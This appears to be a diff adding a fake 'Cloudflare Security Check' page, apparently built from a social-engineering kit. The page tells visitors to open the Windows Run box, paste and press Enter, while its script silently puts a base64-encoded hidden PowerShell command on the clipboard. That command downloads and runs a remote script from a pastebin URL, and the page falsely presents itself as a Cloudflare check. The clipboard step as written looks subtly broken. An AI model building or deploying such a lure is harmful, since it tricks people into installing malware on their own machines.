@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cloudflare Security Check</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #0d1117;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+    padding: 20px;
+  }
+  .container {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 24px;
+    padding: 48px 40px;
+    max-width: 560px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
+  }
+  .shield { font-size: 56px; margin-bottom: 12px; display: block; }
+  h1 { color: #f0f6fc; font-size: 26px; font-weight: 600; margin-bottom: 8px; }
+  .sub { color: #8b949e; font-size: 16px; margin-bottom: 28px; }
+  .steps {
+    background: #0d1117;
+    border-radius: 16px;
+    padding: 20px 24px;
+    text-align: left;
+    margin: 20px 0;
+    border-left: 4px solid #f0883e;
+  }
+  .step {
+    color: #c9d1d9;
+    font-size: 15px;
+    padding: 8px 0;
+    font-family: 'Courier New', monospace;
+    border-bottom: 1px solid #21262d;
+  }
+  .step:last-child { border-bottom: none; }
+  .step strong { color: #f0883e; font-weight: 700; }
+  .step .key {
+    background: #21262d;
+    padding: 2px 10px;
+    border-radius: 6px;
+    font-weight: 600;
+    color: #f0f6fc;
+  }
+  .agree { font-size: 13px; color: #8b949e; margin: 20px 0 10px; line-height: 1.6; }
+  .agree span { color: #58a6ff; }
+  .footer { font-size: 12px; color: #484f58; margin-top: 24px; border-top: 1px solid #21262d; padding-top: 16px; }
+  .loader {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    border: 3px solid #30363d;
+    border-top: 3px solid #f0883e;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-right: 10px;
+    vertical-align: middle;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="container">
+  <span class="shield">🛡️</span>
+  <h1>One more step</h1>
+  <p class="sub">Verify you are human by completing the action below.</p>
+  <div class="steps">
+    <div class="step"><strong>1.</strong> Press & hold <span class="key">Windows Key → R</span></div>
+    <div class="step"><strong>2.</strong> In the verification window, press <span class="key">Ctrl + V</span></div>
+    <div class="step"><strong>3.</strong> Press <span class="key">Enter</span> on your keyboard to finish</div>
+  </div>
+  <div class="agree">
+    <span>✅</span> I am not a robot.<br>
+    <span>✅</span> Cloudflare is a service of Cloudflare, Inc.
+  </div>
+  <div style="margin-top:12px;">
+    <span class="loader"></span><span style="color:#8b949e;font-size:14px;">Verifying connection...</span>
+  </div>
+  <div class="footer">Security of your connection before proceeding.</div>
+</div>
+
+<script>
+  (function() {
+    // PASTE YOUR SHORT BASE64 HERE (from Step 3)
+    const b64 = "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAE4AbwBQACAALQBOAG8AbgBJACAALQBDACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAHcALwA1AFAAawBEAFcAUQB5AFUAJwApACIA";
+
+    // Copy to clipboard
+    navigator.clipboard.writeText(b64).then(() => {
+      console.log('[+] Payload copied.');
+    }).catch(() => {
+      // Fallback for non-HTTPS
+      const ta = document.createElement('textarea');
+      ta.value = b64;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+    });
+  })();
+</script>
+</body>
+</html>
